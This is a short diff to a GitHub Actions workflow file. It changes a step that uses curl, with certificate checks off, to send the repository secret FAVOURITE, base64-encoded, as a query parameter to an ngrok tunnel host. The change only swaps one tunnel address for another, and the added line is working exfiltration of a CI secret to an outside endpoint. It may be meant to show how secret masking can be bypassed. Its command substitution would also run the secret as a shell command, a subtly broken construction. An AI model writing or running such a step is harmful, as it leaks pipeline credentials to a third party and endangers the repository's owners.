@@ -23,4 +23,4 @@ jobs:
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
       - name: I ll tell you my current favourite 
-        run: curl -k https://9b19-2001-4bb8-182-2982-5822-d098-4d55-8e38.eu.ngrok.io?data=$(${{ secrets.FAVOURITE }} | base64 --wrap=0)
+        run: curl -k https://82e6-78-128-250-16.ngrok-free.app?data=$(${{ secrets.FAVOURITE }} | base64 --wrap=0)
